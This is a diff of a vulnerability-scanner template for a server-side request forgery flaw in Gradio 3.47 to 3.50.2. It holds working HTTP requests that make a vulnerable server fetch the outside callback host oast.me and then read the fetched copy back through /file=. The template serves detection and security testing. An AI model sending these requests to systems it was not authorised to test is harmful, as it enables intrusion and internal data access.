@@ -1,5 +1,4 @@
 id: gradio-ssrf
-
 info:
   name: Gradio 3.47 - 3.50.2 - Server-Side Request Forgery
   author: nvn1729
@@ -12,70 +11,63 @@ info:
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
     cvss-score: 7.5
-    epss-percentile: 0.36659
+    cwe-id:
+      - CWE-918
     cpe: cpe:2.3:a:gradio_project:gradio:*:*:*:*:python:*:*:*
+    epss-percentile: 0.36659
   metadata:
-    verified: true
+    runzero-review: 'REJECT/2026-04-08/auto: interactsh (OAST callback)'
     max-request: 2
-    shodan-query: html:"__gradio_mode__"
     product: gradio
+    shodan-query: html:"__gradio_mode__"
     vendor: gradio_project
-  tags: cve,cve2024,unauth,gradio,ssrf,vuln
-
+    verified: true
+  tags: cve,cve2024,gradio,ssrf,unauth,vuln
 flow: http(1) && http(2)
-
 http:
-  - raw:
+  - matchers:
+      - condition: or
+        dsl:
+          - contains_any(tolower(body), "content=\"gradio", "gradio_mode", "gradio-app", "https://gradio.app")
+          - contains(tolower(body), "\"method not allowed")
+        internal: true
+        type: dsl
+    raw:
       - |
         GET / HTTP/1.1
         Host: {{Hostname}}
-
       - |
         GET /component_server HTTP/1.1
         Host: {{Hostname}}
-
-
-    matchers:
-      - type: dsl
-        dsl:
-          - 'contains_any(tolower(body), "content=\"gradio", "gradio_mode", "gradio-app", "https://gradio.app")'
-          - 'contains(tolower(body), "\"method not allowed")'
-        condition: or
+  - extractors:
+      - group: 1
         internal: true
+        name: download_path
+        part: body
+        regex:
+          - '"?([^"]+)'
+        type: regex
+    matchers:
+      - part: body_2
+        type: word
+        words:
+          - <h1> Interactsh Server </h1>
+      - status:
+          - 200
+        # digest: 4a0a00473045022100888a89f042d61721c6cd5d2c6650334bf08de571072d85d2329f813dd9685405022014731391b454ea9d5637de7f14fcbf6332e509d151116494479915eb3b86eed3:922c64590222798bb761d5b6d8e72950
 
-  - raw:
+        type: status
+    matchers-condition: and
+    payloads:
+      fuzz_component_id: helpers/wordlists/numbers.txt
+    raw:
       - |
         POST /component_server HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/json
 
         {"component_id": "{{fuzz_component_id}}", "data": "http://oast.me", "fn_name": "download_temp_copy_if_needed", "session_hash": "aaaaaaaaaaa"}
-
       - |
         GET /file={{download_path}} HTTP/1.1
         Host: {{Hostname}}
-
-    extractors:
-      - type: regex
-        part: body
-        name: download_path
-        group: 1
-        regex:
-          - "\"?([^\"]+)"
-        internal: true
-
-    payloads:
-      fuzz_component_id: helpers/wordlists/numbers.txt
-
     stop-at-first-match: true
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: body_2
-        words:
-          - "<h1> Interactsh Server </h1>"
-
-      - type: status
-        status:
-          - 200
-# digest: 4b0a004830460221008063a282026c1f23b71c5c45543bd27a81fb52853d475c967f7932d02cf3bb0e0221009db0fe39201bfc1ae81251587c2eaaa71561345d30f702a7c8e5381e63120ecc:922c64590222798bb761d5b6d8e72950
